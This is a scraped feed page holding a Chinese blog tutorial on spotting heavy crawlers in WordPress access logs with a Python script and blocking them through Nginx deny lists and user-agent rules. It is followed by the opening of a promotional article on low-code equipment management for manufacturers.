                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>你是否遇到过这种情况：</p>
<ul>
<li><strong>现象</strong>：你的WordPress博客突然变慢，甚至出现 502 Bad Gateway 错误。</li>
<li><strong>排查</strong>：登录服务器查看 ​<code>​top​</code>​，发现 CPU 占用率飙升到 100%，PHP-FPM 进程多得吓人。</li>
<li><strong>真相</strong>：查看 Nginx 或 Apache 的访问日志，发现并没有多少真实人类在看文章，反而是大量的机器人在疯狂抓取。</li>
</ul>
<p><strong>为什么资源会紧张？</strong> WordPress 是动态网站，每一次页面访问都需要 PHP 解析和 MySQL 查询。如果一个爬虫每秒发起 10 个请求，对于一台配置较低（如 1核2G）的 VPS 来说，这就足以让数据库崩溃。</p>
<p>除了 Google、Bing 这种带来流量的“好爬虫”，互联网上充斥着大量<strong>无用爬虫</strong>：</p>
<ol>
<li><strong>SEO工具爬虫</strong>（Ahrefs, Semrush, MJ12bot）：对你没流量贡献，却疯狂消耗资源。</li>
<li><strong>内容采集器</strong>：想把你的原创文章搬运走。</li>
<li><strong>bug扫描器</strong>：疯狂探测 ​<code>​wp-login.php​</code>​ 或 ​<code>​xmlrpc.php​</code>​。</li>
</ol>
<p>今天，我们不装臃肿的防火墙插件，而是用 <strong>Python</strong> 这种轻量级武器，从日志中揪出这些“资源吸血鬼”，并在服务器层面直接封杀。</p>
<hr/>
<h3 data-id="heading-0">🛠️ 第一步：获取作案证据（访问日志）</h3>
<p>首先，你需要找到 Web 服务器的访问日志（Access Log）。 通常在 Linux 服务器上，路径如下：</p>
<ul>
<li><strong>Nginx</strong>: ​<code>​/var/log/nginx/access.log​</code>​</li>
<li><strong>Apache</strong>: ​<code>​/var/log/apache2/access.log​</code>​ 或 ​<code>​/var/log/httpd/access_log​</code>​</li>
</ul>
<p>把这个文件下载到本地，或者直接在服务器上用 Python 处理。</p>
<hr/>
<h3 data-id="heading-1">🐍 第二步：Python 编写“爬虫侦探”脚本</h3>
<p>我们将编写一个 Python 脚本，完成以下任务：</p>
<ol>
<li>解析日志文件。</li>
<li>统计 IP 的访问频率。</li>
<li>统计 User-Agent（用户代理）的分布。</li>
<li>自动生成封禁名单。</li>
</ol>
<h4 data-id="heading-2">核心代码：​<code>​analyze_bot.py​</code>​</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> re
<span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> Counter
<span class="hljs-keyword">import</span> csv

<span class="hljs-comment"># --- 配置区域 ---</span>
LOG_FILE = <span class="hljs-string">'access.log'</span>  <span class="hljs-comment"># 你的日志文件路径</span>
THRESHOLD = <span class="hljs-number">500</span>          <span class="hljs-comment"># 阈值：如果一个IP在日志中出现超过500次，视为可疑</span>
OUTPUT_BAN_FILE = <span class="hljs-string">'nginx_deny_list.conf'</span> <span class="hljs-comment"># 输出的封禁配置文件</span>

<span class="hljs-comment"># Nginx日志正则匹配模式 (根据你的日志格式调整，这是默认格式)</span>
<span class="hljs-comment"># 格式示例: 192.168.1.1 - - [23/Nov/2025:10:00:00 +0000] "GET / HTTP/1.1" 200 ...</span>
LOG_PATTERN = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r'(?P&lt;ip&gt;\d+.\d+.\d+.\d+).*?"(?P&lt;method&gt;\w+) (?P&lt;path&gt;.*?) HTTP.*?" (?P&lt;status&gt;\d+) .*?"(?P&lt;agent&gt;.*?)"'</span>)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">analyze_logs</span>():
    ip_counter = Counter()
    ua_counter = Counter()
    suspicious_ips = {} <span class="hljs-comment"># 存储 {ip: user_agent}</span>

    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"🔄 正在分析日志: <span class="hljs-subst">{LOG_FILE}</span> ..."</span>)
    
    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(LOG_FILE, <span class="hljs-string">'r'</span>, encoding=<span class="hljs-string">'utf-8'</span>, errors=<span class="hljs-string">'ignore'</span>) <span class="hljs-keyword">as</span> f:
        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:
            <span class="hljs-keyword">match</span> = LOG_PATTERN.search(line)
            <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:
                data = <span class="hljs-keyword">match</span>.groupdict()
                ip = data[<span class="hljs-string">'ip'</span>]
                ua = data[<span class="hljs-string">'agent'</span>]
                
                <span class="hljs-comment"># 统计IP和UA</span>
                ip_counter[ip] += <span class="hljs-number">1</span>
                ua_counter[ua] += <span class="hljs-number">1</span>
                
                <span class="hljs-comment"># 记录最后一次该IP使用的UA，方便人工复核</span>
                suspicious_ips[ip] = ua

    <span class="hljs-keyword">return</span> ip_counter, ua_counter, suspicious_ips

<span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_report</span>(<span class="hljs-params">ip_counts, ua_counts, suspicious_data</span>):
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"\n--- 📊 访问量 Top 10 IP ---"</span>)
    top_ips = ip_counts.most_common(<span class="hljs-number">10</span>)
    <span class="hljs-keyword">for</span> ip, count <span class="hljs-keyword">in</span> top_ips:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"IP: <span class="hljs-subst">{ip}</span> | 次数: <span class="hljs-subst">{count}</span> | UA摘要: <span class="hljs-subst">{suspicious_data[ip][:<span class="hljs-number">30</span>]}</span>..."</span>)

    <span class="hljs-built_in">print</span>(<span class="hljs-string">"\n--- 🤖 访问量 Top 10 User-Agents ---"</span>)
    <span class="hljs-keyword">for</span> ua, count <span class="hljs-keyword">in</span> ua_counts.most_common(<span class="hljs-number">10</span>):
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"次数: <span class="hljs-subst">{count}</span> | UA: <span class="hljs-subst">{ua}</span>"</span>)

    <span class="hljs-comment"># 生成 Nginx 封禁列表</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\n--- 🚫 生成封禁建议 (超过 <span class="hljs-subst">{THRESHOLD}</span> 次访问) ---"</span>)
    banned_count = <span class="hljs-number">0</span>
    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(OUTPUT_BAN_FILE, <span class="hljs-string">'w'</span>) <span class="hljs-keyword">as</span> f:
        f.write(<span class="hljs-string">"# Auto-generated block list\n"</span>)
        <span class="hljs-keyword">for</span> ip, count <span class="hljs-keyword">in</span> ip_counts.items():
            <span class="hljs-keyword">if</span> count &gt; THRESHOLD:
                <span class="hljs-comment"># 排除本地回环</span>
                <span class="hljs-keyword">if</span> ip.startswith(<span class="hljs-string">'127.0.0'</span>): <span class="hljs-keyword">continue</span> 
                
                <span class="hljs-comment"># 写入 Nginx 格式: deny 1.2.3.4;</span>
                f.write(<span class="hljs-string">f"deny <span class="hljs-subst">{ip}</span>;\n"</span>)
                banned_count += <span class="hljs-number">1</span>
    
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"✅ 已生成配置文件: <span class="hljs-subst">{OUTPUT_BAN_FILE}</span>"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"🔨 建议封禁的 IP 数量: <span class="hljs-subst">{banned_count}</span>"</span>)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    <span class="hljs-keyword">try</span>:
        ip_counts, ua_counts, suspicious_data = analyze_logs()
        generate_report(ip_counts, ua_counts, suspicious_data)
    <span class="hljs-keyword">except</span> FileNotFoundError:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"❌ 错误：找不到日志文件，请检查路径。"</span>)
</code></pre>
<hr/>
<h3 data-id="heading-3">🕵️ 第三步：案例分析与实战操作</h3>
<p>假设你运行了上面的代码，得到以下输出结果，我们来分析几个典型场景。</p>
<h4 data-id="heading-4">场景 A：暴力的 IP 采集者</h4>
<p><strong>脚本输出：</strong></p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">IP:</span> <span class="hljs-number">45.132</span><span class="hljs-string">.xx.xx</span> <span class="hljs-string">|</span> <span class="hljs-string">次数:</span> <span class="hljs-number">5000</span> <span class="hljs-string">|</span> <span class="hljs-string">UA摘要:</span> <span class="hljs-string">Python-urllib/3.8...</span>
</code></pre>
<p><strong>分析</strong>：一个 IP 访问了 5000 次，User-Agent 竟然是 ​<code>​Python-urllib​</code>​。这意味着有人在写简陋的脚本暴力抓取你的站，完全没有伪装。 <strong>对策</strong>：<strong>直接封杀 IP</strong>。</p>
<h4 data-id="heading-5">场景 B：伪装成正常的 SEO 工具</h4>
<p><strong>脚本输出：</strong></p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">次数:</span> <span class="hljs-number">2000</span> <span class="hljs-string">|</span> <span class="hljs-attr">UA:</span> <span class="hljs-string">Mozilla/5.0</span> <span class="hljs-string">(compatible;</span> <span class="hljs-string">MJ12bot/v1.4.8;</span> <span class="hljs-string">...)</span>
<span class="hljs-string">次数:</span> <span class="hljs-number">1500</span> <span class="hljs-string">|</span> <span class="hljs-attr">UA:</span> <span class="hljs-string">Mozilla/5.0</span> <span class="hljs-string">(compatible;</span> <span class="hljs-string">SemrushBot/7~bl;</span> <span class="hljs-string">...)</span>
</code></pre>
<p><strong>分析</strong>：MJ12bot 和 SemrushBot 是著名的 SEO 分析工具。它们不是恶意ddos，但它们抓取频率极高，而且对普通博客来说，这类商业 SEO 数据的价值远低于它们消耗的服务器资源。 <strong>对策</strong>：<strong>通过 User-Agent 屏蔽</strong>。</p>
<h4 data-id="heading-6">场景 C：恶意扫描</h4>
<p><strong>日志特征</strong>： 脚本发现某个 IP 的 ​<code>​path​</code>​ 全是 ​<code>​/wp-login.php​</code>​, ​<code>​.env​</code>​, ​<code>​sql.bak​</code>​ 等。 <strong>分析</strong>：这是在扫描bug，试图爆破后台。 <strong>对策</strong>：<strong>立刻封杀，并安装 Fail2Ban 自动处理。</strong></p>
<hr/>
<h3 data-id="heading-7">🛡️ 第四步：实施封锁</h3>
<p>Python 帮我们找出了敌人，现在要在服务器层面进行拦截。</p>
<h4 data-id="heading-8">1. 基于 IP 的封禁 (Nginx)</h4>
<p>Python 脚本已经生成了 ​<code>​nginx_deny_list.conf​</code>​，内容大致如下：</p>
<pre><code class="hljs language-ini" lang="ini">deny 45.132.11.22<span class="hljs-comment">;</span>
deny 103.21.33.44<span class="hljs-comment">;</span>
</code></pre>
<p><strong>部署方法：</strong></p>
<ol>
<li>将该文件上传到 Nginx 配置目录（如 ​<code>​/etc/nginx/conf.d/​</code>​）。</li>
<li>在你的网站配置文件（​<code>​server​</code>​ 块内）引入它：</li>
</ol>
<pre><code class="hljs language-ini" lang="ini">server {
    listen 80<span class="hljs-comment">;</span>
    server_name example.com<span class="hljs-comment">;</span>
    
    <span class="hljs-comment"># 引入封禁列表</span>
    include /etc/nginx/conf.d/nginx_deny_list.conf<span class="hljs-comment">;</span>
    
    location / {
        ...
    }
}
</code></pre>
<ol>
<li>重载 Nginx：​<code>​sudo nginx -s reload​</code>​。 <em>效果：这些 IP 访问时直接返回 403 Forbidden，甚至不消耗 PHP 资源。</em></li>
</ol>
<h4 data-id="heading-9">2. 基于 User-Agent 的封禁 (Nginx)</h4>
<p>针对那些换 IP 很勤快，但 UA 固定的爬虫（如 MJ12bot, AhrefsBot），直接在 Nginx 配置文件中添加判断：</p>
<pre><code class="hljs language-bash" lang="bash">server {
    <span class="hljs-comment"># ... 其他配置</span>
    
    <span class="hljs-comment"># 禁止特定的 User-Agent</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$http_user_agent</span> ~* (MJ12bot|AhrefsBot|SemrushBot|DotBot|PetalBot|Bytespider)) {
        <span class="hljs-built_in">return</span> 403;
    }
}
</code></pre>
<p><em>注意：</em> ​<code>​Bytespider​</code>​<em>​ 是字节跳动的爬虫，非常凶猛，如果是中文站且不需要今日头条的流量，建议限制或封禁。</em></p>
<hr/>
<h3 data-id="heading-10">🚀 进阶技巧：自动化防御 (Fail2Ban)</h3>
<p>虽然 Python 脚本分析很有用，但手动跑太累。对于 WordPress，建议结合 <strong>Fail2Ban</strong> 实现自动化。</p>
<p>虽然 Fail2Ban 不是 Python 写的（虽然它现在也有 Python 绑定），但它的逻辑和我们上面的脚本一样：<strong>读日志 -&gt; 正则匹配 -&gt; 调用防火墙(iptables)封IP</strong>。</p>
<p><strong>简单的 WordPress 防爆破配置思路：</strong></p>
<ol>
<li>安装 Fail2Ban。</li>
<li>配置 Jail 监控 ​<code>​/var/log/auth.log​</code>​ 或 Nginx 日志。</li>
<li>规则：如果在 5 分钟内访问 ​<code>​wp-login.php​</code>​ 返回非 200 状态码超过 5 次，封禁 IP 1小时。</li>
</ol>
<hr/>
<h3 data-id="heading-11">对于资源紧张的 WordPress 博客：</h3>
<ol>
<li><strong>定期分析</strong>：使用提供的 Python 脚本定期（如每周）“体检”，看看到底是谁在消耗你的 CPU。</li>
<li><strong>狠心做减法</strong>：对于不带来直接流量的国外 SEO 爬虫（Ahrefs, MJ12等），建议直接在 Nginx 层屏蔽 User-Agent。</li>
<li><strong>精确打击</strong>：对于异常高频的单个 IP，利用 Python 生成的黑名单直接 Deny。</li>
</ol>
<p>通过这套组合拳，你会发现服务器负载会瞬间下降，博客又能秒开了！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[低代码高价值场景：让设备管理真正成为企业数字化资产]]></title>    <link>https://juejin.cn/post/7576175307351425039</link>    <guid>https://juejin.cn/post/7576175307351425039</guid>    <pubDate>2025-11-24T06:59:30.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576175307351425039" data-draft-id="7575457788665249844" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="低代码高价值场景：让设备管理真正成为企业数字化资产"/> <meta itemprop="keywords" content="低代码"/> <meta itemprop="datePublished" content="2025-11-24T06:59:30.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="得帆云低代码"/> <meta itemprop="url" content="https://juejin.cn/user/2254449849150557"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            低代码高价值场景：让设备管理真正成为企业数字化资产
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2254449849150557/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    得帆云低代码
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T06:59:30.000Z" title="Mon Nov 24 2025 06:59:30 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>本文作者：得帆信息联合创始人&amp;CIO刘鑫</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/acc9bf79a8984fffbd30ddfc8a68b4d4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X5biG5LqR5L2O5Luj56CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572370&amp;x-signature=iV7ILyq4FRePGp1CofV3ODA%2BilY%3D" alt="图片" loading="lazy"/></p>
<h3 data-id="heading-0"><strong>制造业设备管理的痛点</strong></h3>
<p>在制造业的生产现场，设备是产能的根基。无论是冲压机、注塑机还是检测设备，一旦停机，生产节拍就被打乱，交付计划可能瞬间失控。设备的稳定运行不仅关乎生产效率，更直接影响到客户对“工厂管理水平”的评估。</p>
<p>然而，现实中许多制造企业的设备管理仍停留在“半人工化”的阶段：设备台账、保养计划、点检记录分散在各个Excel表格和纸质检查单上。时间一久，信息碎片化、追溯困难的问题开始显现。设备何时保养？上次故障原因？是否按周期点检？这些问题往往需要翻找文件夹、逐页查找才能得到答案。</p>
<p>更棘手的是，当下游客户前来验厂时，审核人员往往要求在短时间内提供设备档案、点检记录和维修历史，但现场人员却需要花费数小时才能拼凑出完整资料。看似只是信息管理问题，实则是影响客户信任度和供应链竞争力的关键环节。</p>
<p>这也让越来越多制造企业开始思考——如何用系统化的手段替代手工Excel，让设备管理真正成为企业的数字化资产。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1354cefb58e24544a50cd87a412ec166~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X5biG5LqR5L2O5Luj56CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572370&amp;x-signature=Q%2FOlA5rzhnYB0QzFUk5HV1Ig%2FcA%3D" alt="图片" loading="lazy"/></p>
<h3 data-id="heading-1"><strong>为什么选择低代码模式来构建设备管理？</strong></h3>
<p>不少企业最初尝试通过OA或MES等工具来实现设备管理，比如用表单模块做设备台账，用流程引擎审批保养计划。虽然短期内可以上线，但很快问题暴露出来：移动端体验不佳、一线操作繁琐，业务规则难以灵活配置，流程稍复杂就变得僵硬低效。最终，这类“临时方案”往往难以支撑企业持续改进设备管理的目标。</p>
<p>事实上，设备管理的数字化，本质上是一个从纸质到线上、从管理到运营的渐进式变革过程。一线操作人员需要时间去适应数字化工具，如果系统一开始就过于复杂，反而会造成抵触情绪，降低使用意愿。这就要求系统具备“可生长性”，能从基础台账管理逐步扩展到巡检、保养、维修、能耗分析等更精细的环节。</p>
<p>低代码平台正好契合了这一需求。它既能在初期快速搭建出简洁、易用的应用原型，降低一线用户的学习门槛；又能随着企业管理成熟度的提升，通过灵活配置规则、表单、流程，逐步完善业务深度。相比传统定制开发，低代码的最大价值不在“便宜”或“快”，而在于让企业的系统建设与管理能力同步成长。</p>
<p>正因如此，如今越来越多制造企业，尤其是以设备为核心资产的生产型工厂，选择用低代码平台构建自己的设备管理系统，让数字化真正服务于现场管理，而非成为新的负担。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4fd1db1696ce4915ba60feb957649e5e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X5biG5LqR5L2O5Luj56CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572370&amp;x-signature=%2FWZ49%2FpOy9OqxOZACfcSdgMGkLE%3D" alt="图片" loading="lazy"/></p>
<h2 data-id="heading-2"><strong>低代码实现设备管理进阶管理</strong></h2>
<p>在落地层面，很多企业在推进设备管理系统时都会发现，不同阶段的管理需求差异巨大，一套系统难以“一步到位”。因此，建设路径往往需要从基础到深入、从局部到全面，循序渐进地展开。</p>
<p>从管控深度上看，设备管理通常经历三个阶段：</p>
<ul>
<li>阶段一：资产台账管理，以设备台账为核心，先把“家底”摸清楚，实现设备信息、状态、位置、责任人等基础数据的统一管理；</li>
<li>阶段二：全生命周期流程管理，将点检、保养、维修、备件等关键流程线上化、标准化，让设备管理从“被动记录”走向“主动预防”；</li>
<li>阶段三：实时物联管理，通过传感器和IoT接入，实现设备运行数据的实时采集与预警分析，帮助管理者从数据中洞察风险与优化空间。</li>
</ul>
<p>而从管理范围上看，企业往往不仅仅管理“设备”本身，还会延伸至模具、治具、工装等关键生产资源。不同资产类型虽在管理逻辑上各有差异，但背后共通的目标是一致的，让现场管理更加透明、可追溯、可优化。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6f6db0fe5920454199b497f4c4e1c28f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X5biG5LqR5L2O5Luj56CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572370&amp;x-signature=SLCyNIbKvYOTo%2BnVd9QrBL%2B1cL0%3D" alt="图片" loading="lazy"/></p>
<p>在得帆低代码的客户实践中，设备管理已成为最具代表性、也是最常被落地的业务场景之一。相比CRM、SRM等传统管理系统，设备管理的项目覆盖率更高，综合排名稳居第一。原因在于：它既贴近生产现场，又能直接体现数字化的管理成效。</p>
